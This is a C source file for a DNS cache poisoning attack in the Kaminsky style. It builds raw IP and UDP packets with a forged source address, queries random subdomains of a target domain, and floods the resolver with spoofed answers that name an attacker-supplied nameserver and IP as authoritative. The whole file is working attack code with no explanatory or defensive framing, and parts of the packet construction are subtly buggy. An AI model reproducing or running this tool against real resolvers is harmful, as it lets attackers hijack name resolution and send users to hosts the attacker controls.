#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <getopt.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/ip.h>
#include <netinet/udp.h>


#define dnsBindPort         53
#define dnsSourcePort       33333
#define subdomainLen        5
#define maxSubLen           256
#define ipHeaderLen         sizeof(struct iphdr)
#define udpHeaderLen        sizeof(struct udphdr)


// packet and length
typedef struct
{ 
    uint8_t *p;
    size_t l; 
} packet_t;

/* DNS class and type enums */

enum RR_TYPE   {A=1, NS=2, CNAME=5, SOA=6, PTR=12, MX=15, TXT=16};
enum DNS_CLASS {IN=1, CH=3, HS=4};


/*
    calculates checksum of buffer buffer[]
    returns checksum in big endian
*/
uint16_t checkSum( uint8_t buffer[], size_t bufferLen )
{
    uint32_t sum = 0, i;
    if( bufferLen < 1 )
        return 0;
    for(i=0; i<bufferLen-1; i+=2)
        sum+=*(uint16_t*)&buffer[i];                 // half-words
    if( bufferLen & 1 )
        sum += buffer[bufferLen - 1];                // last byte if odd
    return ~((sum >> 16) + (sum & 0xffff));             // high to low + 1's comp
}


/*
    uses raw socket for spoofing
    sends dns packet ip = udp = dns
*/
int sendPacketRaw( char *sourceIP, char *destIP, uint16_t sourcePort, uint16_t destPort, packet_t dnsPacket )
{
    packet_t packet = {
        .p = malloc(ipHeaderLen + udpHeaderLen + dnsPacket.l),
        .l =        ipHeaderLen + udpHeaderLen + dnsPacket.l
    };
    struct sockaddr_in targetAddress = {
            .sin_zero        = { 0,0,0,0,0,0,0,0 },
            .sin_family      = AF_INET,
            .sin_port        = 0,     
            .sin_addr.s_addr = inet_addr(destIP)
    };
    struct iphdr  *ipHeader  = (struct iphdr*)  packet.p;
    struct udphdr *udpHeader = (struct udphdr*) (ipHeader + 1);
    int socketDes, returnVal = 0, on = 1; 
    bzero(packet.p, packet.l);
    // ip header
    ipHeader->saddr    = inet_addr(sourceIP);
    ipHeader->daddr    = inet_addr(destIP);
    ipHeader->protocol = IPPROTO_UDP;
    ipHeader->tot_len  = htons(packet.l - ipHeaderLen);
    // udp header
    udpHeader->source = htons(sourcePort);
    udpHeader->dest   = htons(destPort);
    udpHeader->len    = htons(packet.l - ipHeaderLen);
    udpHeader->check  = 0;
    // dns packet as payload
    memcpy(&packet.p[ipHeaderLen + udpHeaderLen], dnsPacket.p, dnsPacket.l);
    // update checksum
    udpHeader->check   = checkSum(packet.p, packet.l);
    // ip header
    ipHeader->version  = 4;
    ipHeader->ihl      = 5;     
    ipHeader->tos      = 0;     
    ipHeader->tot_len  = htons(packet.l);
    ipHeader->id       = htons(9999); 
    ipHeader->frag_off = 0; 
    ipHeader->ttl      = 64;        
    ipHeader->check    = checkSum(packet.p, 20);
    // sending the packet
    if((socketDes = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
        perror("Error! Cannot create raw socket");
        returnVal = -1;
    }
    else if( setsockopt(socketDes, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0 ) {
        perror("Error! Cannot set IP_HDRINCL");
        returnVal = -1;
    }
    else if(sendto(socketDes, packet.p, packet.l, 0, (struct sockaddr*)&targetAddress, sizeof(targetAddress)) < 0) {
        perror("Error! Cannot send spoofed packet");
        returnVal = -1;
    }
    free(packet.p);
    close(socketDes);
    return returnVal;
}


/*
    send packet using hosts udp socket
*/
int sendPacketUdp( char *destIP, uint16_t destPort, packet_t dnsPacket )
{
    int socketDes;
    struct sockaddr_in targetAddress = {
            .sin_zero        = { 0,0,0,0,0,0,0,0 },
            .sin_family      = AF_INET,
            .sin_port        = htons(destPort),
            .sin_addr.s_addr = inet_addr(destIP)
    };
    if((socketDes = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Error! Cannot create UDP socket");      
        return -1;
    }
    if(sendto(socketDes, dnsPacket.p, dnsPacket.l, 0, (struct sockaddr*)&targetAddress, sizeof(targetAddress)) < 0) {
        perror("Error! Cannot send UDP packet");
        close( socketDes );
        return -1;
    }
    return socketDes;
}


/*
    creates DNS header on packet P
*/
void makeDnsHeader( packet_t *P, uint16_t id, uint16_t flags, uint16_t  questCount, uint16_t ansCount,
                 uint16_t nsCount, uint16_t addCount )
{
    struct dnshdr {
        uint16_t id;
        uint16_t flags;
        uint16_t ques_cnt, ansr_cnt, ns_cnt, addr_cnt;
    } __attribute__ ((packed)) *dnsHeader;
    P->p = malloc( sizeof(struct dnshdr) );
    P->l = sizeof(struct dnshdr);
    dnsHeader = (struct dnshdr*) P->p;
    dnsHeader->id       = htons(id    );
    dnsHeader->flags    = htons(flags );
    dnsHeader->ques_cnt = htons(questCount);
    dnsHeader->ansr_cnt = htons(ansCount);
    dnsHeader->ns_cnt   = htons(nsCount);
    dnsHeader->addr_cnt = htons(addCount);
}

void freePacket( packet_t *P )
{
    free(P->p);
}

/*
    adds question to packet P
*/
uint8_t appendQues( packet_t *P, uint16_t quesClass, uint16_t quesType, const char *quesName )
{
    char    *token, *s1, *s2;
    uint8_t nameOffset;
    P->p = realloc(P->p, P->l + strlen(quesName) +2 +2 +2);
    s1 = malloc(strlen(quesName) + 1);
    s2 = s1;
    strcpy(s1, quesName);
    nameOffset = P->l; 
    for(token=strtok(s2, "."); token; token=strtok(NULL, ".")) {
        sprintf( &P->p[P->l], "%c%s", (uint8_t)strlen(token), token );
        P->l += strlen(token) + 1;
    }
    P->p[P->l++]  = '\0';    
    free(s1);
    *(uint16_t*)&P->p[P->l]     = htons(quesType);
    *(uint16_t*)&P->p[P->l + 2] = htons(quesClass);
    P->l += 4;
    return nameOffset;
}

/*
    adds response to packet P
*/
uint8_t appendResponse( packet_t *P, uint16_t class, uint16_t type, char *rdata, uint8_t off )
{
    char    *token, *s1, *s2; 
    uint8_t nameOffset = -1;
    P->p = realloc(P->p, P->l +2 +2 +2 +4 +2 + (type == A ? 4 : strlen(rdata)+2));
    *(uint16_t*)&P->p[P->l]     = htons(0xc000 | off);
    *(uint16_t*)&P->p[P->l + 2] = htons(type);    
    *(uint16_t*)&P->p[P->l + 4] = htons(class);   
    *(uint32_t*)&P->p[P->l + 6] = htonl(86400);
    P->l += 10;
    if(type==A)
    {
        *(uint16_t*)&P->p[P->l + 0] = htons(4);
        *(uint32_t*)&P->p[P->l + 2] = inet_addr(rdata);
        P->l += 6;
    }
    else if(type==NS)
    {
        *(uint16_t*)&P->p[P->l] = htons(strlen(rdata)+2);
        P->l += 2;
        s1 = malloc(strlen(rdata) + 1);
        s2 = s1;
        strcpy(s1, rdata);
        nameOffset = P->l;
        for(token=strtok(s2, "."); token; token=strtok(NULL, ".")) {
            sprintf( &P->p[P->l], "%c%s", (uint8_t)strlen(token), token );
            P->l += strlen(token) + 1;
        }
        P->p[P->l++]  = '\0';
        free(s1);
    }
    return nameOffset;
}

/*
    Attack
*/
int main( int argc, char *argv[] )
{
    struct option longopt[] = {
        {"domain",     required_argument, 0, 'a'}, 
        {"ip",         required_argument, 0, 'b'}, 
        {"attacker-ns",required_argument, 0, 'c'}, 
        {"attacker-ip",required_argument, 0, 'd'}, 
        {"orig-ns",    required_argument, 0, 'e'}, 
        {"n-requests", required_argument, 0, 'f'}, 
        {"n-responses",required_argument, 0, 'g'},
        {"n-tries",    required_argument, 0, 'i'},
    };
    packet_t D = {.p = NULL, .l = 0 };
    char    *domain=NULL, *ip=NULL, *attacker_ns=NULL, *attacker_ip=NULL, *orig_ns=NULL;
    uint16_t ndupreq=100, ndupresp=1000,ntries=1000;

    char     randomSubDomain[maxSubLen];
    int      socketDes[200];
    int      opt, longidx = 0;
    int      count, i;

    while( (opt = getopt_long(argc, argv, "a:b:c:d:e:f:g:i", longopt, &longidx)) != -1)
        switch(opt) 
        {           
            case 'a': domain      = optarg; break;
            case 'b': ip          = optarg; break;
            case 'c': attacker_ns = optarg; break;
            case 'd': attacker_ip = optarg; break;
            case 'e': orig_ns     = optarg; break;
            case 'f': ndupreq     = atoi(optarg); break;
            case 'g': ndupresp    = atoi(optarg); break;
            case 'i': ntries      = atoi(optarg); break;
            default :
                printf("Enter valid arguments.\n");
                return -1;
        }
    srand(time(NULL));
    for( count=1; count<=ntries; count++ )
    {   
        sleep(0.5);
        printf( "Attacking attempt : %d.\n", count );
        bzero(randomSubDomain, maxSubLen);
        for(i=0; i<subdomainLen; ++i)
            randomSubDomain[i] = 'a' + rand() % 26;
        randomSubDomain[subdomainLen] = '.';
        strncat(randomSubDomain, domain, maxSubLen-subdomainLen-1);
        printf( "Trying random subdomain: %s.\n", randomSubDomain);
        printf( "Sending %d duplicate requests.\n", ndupreq );
        for( i=0; i<ndupreq; ++i )                          
        {
            makeDnsHeader(&D, rand() % 0xffff, 0x0100, 1, 0, 0, 0); 
            appendQues(&D, IN, A, randomSubDomain);
            socketDes[i] = sendPacketUdp(ip,dnsBindPort,D);
            freePacket(&D);
        }
        printf( "Sending %d spoofed responses.\n", ndupresp );
        for( i=0; i<ndupresp; ++i )
        {
            int off1, off2;
            makeDnsHeader(&D, rand() % 0xffff, 0x8400, 1, 1, 1, 2);
            off1 = appendQues(&D, IN, A,  randomSubDomain);
                   appendResponse(&D, IN, A,  attacker_ip, off1);
            off2 = appendResponse(&D, IN, NS, attacker_ns, off1+subdomainLen+1 );
                   appendResponse(&D, IN, A,  attacker_ip, off2);
            // add OPT to D
            packet_t *P=&D;
            P->p = realloc(P->p, P->l +11);
            *(uint16_t*)&P->p[P->l]     = htons(0);             // name:root
            *(uint16_t*)&P->p[P->l + 1] = htons(41);            // type:opt(41)
            *(uint16_t*)&P->p[P->l + 3] = htons(4096);          // UDP payload size 4096
            *(uint16_t*)&P->p[P->l + 5] = htons(0);             // higher bits 0
            *(uint16_t*)&P->p[P->l + 6] = htons(0);             // EDNS0 version
            *(uint16_t*)&P->p[P->l + 7] = htons(0x8000);        // Z 0x8000
            *(uint16_t*)&P->p[P->l + 9] = htons(0);             // Data length 0
            P->l+=11;
            sendPacketRaw(orig_ns, ip, dnsBindPort, dnsSourcePort, D);
            freePacket(&D);    
        }
        for( i=0; i<ndupreq; ++i ) {
                close(socketDes[i]);
        }
    }
    return 0;
}